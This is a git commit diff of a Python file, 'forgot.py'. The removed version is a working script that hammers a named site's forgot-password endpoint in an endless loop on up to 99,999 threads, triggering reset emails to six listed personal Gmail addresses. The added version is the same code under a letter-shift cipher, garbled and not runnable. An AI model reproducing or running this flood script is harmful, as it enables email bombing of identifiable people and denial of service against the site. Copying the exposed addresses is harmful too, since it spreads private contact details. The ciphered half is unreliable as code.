dde9326afa59f10f84d34941ec666983941a7718
Hisu Han <58086385+SHLEAK@users.noreply.github.com>
2023-06-29 08:37:52 +0900

    Update forgot.py

--- forgot.py
+++ forgot.py
@@ -1,32 +1,32 @@
-from concurrent.futures import ThreadPoolExecutor
-import requests
-def check_email(email):
-    url = "https://www.revera-track.com/api/auth/forgot"
-    payload = {
-        "isFrontend": 1,
-        "email": email,
-        "allowedLevels": [1],
-        "appTarget": "student"
+myvt jvujbyylua.mbabylz ptwvya AoylhkWvvsLeljbavy
+ptwvya ylxblzaz
+klm joljr_lthps(lthps):
+    bys = "oaawz://ddd.ylclyh-ayhjr.jvt/hwp/hbao/mvynva"
+    whfsvhk = {
+        "pzMyvualuk": 1,
+        "lthps": lthps,
+        "hssvdlkSlclsz": [1],
+        "hwwAhynla": "zabklua"
     }
-    while True:
-        try:
-            response = requests.post(url, json = payload, timeout = 1)
-            break
-        except:
-            pass
-    data = response.text.strip()
-    if data == "1":
-        return True
-    else:
-        return False
-emails = ["eric.seo0104@gmail.com", "evalou004@gmail.com", "ikuaktee08130@gmail.com", "jaeeunjanejung@gmail.com", "rosakimhyo@gmail.com", "revera9991@gmail.com"]
-iterations = 0
-with ThreadPoolExecutor(max_workers = 99999) as executor:
-    try:
-        while True:
-            for email in emails:
-                future = executor.submit(check_email, email)
-            iterations += 1
-            print("Number of iterations:", iterations)
-    except KeyboardInterrupt:
-        print("Program interrupted. Exiting...")
+    dopsl Aybl:
+        ayf:
+            ylzwvuzl = ylxblzaz.wvza(bys, qzvu = whfsvhk, aptlvba = 1)
+            iylhr
+        lejlwa:
+            whzz
+    khah = ylzwvuzl.alea.zaypw()
+    pm khah == "1":
+        ylabyu Aybl
+    lszl:
+        ylabyu Mhszl
+lthpsz = ["lypj.zlv0104@nthps.jvt", "lchsvb004@nthps.jvt", "prbhrall08130@nthps.jvt", "qhllbuqhulqbun@nthps.jvt", "yvzhrptofv@nthps.jvt", "ylclyh9991@nthps.jvt"]
+palyhapvuz = 0
+dpao AoylhkWvvsLeljbavy(the_dvyrlyz = 99999) hz leljbavy:
+    ayf:
+        dopsl Aybl:
+            mvy lthps pu lthpsz:
+                mbabyl = leljbavy.zbitpa(joljr_lthps, lthps)
+            palyhapvuz += 1
+            wypua("Ubtily vm palyhapvuz:", palyhapvuz)
+    lejlwa RlfivhykPualyybwa:
+        wypua("Wyvnyht pualyybwalk. Lepapun...")
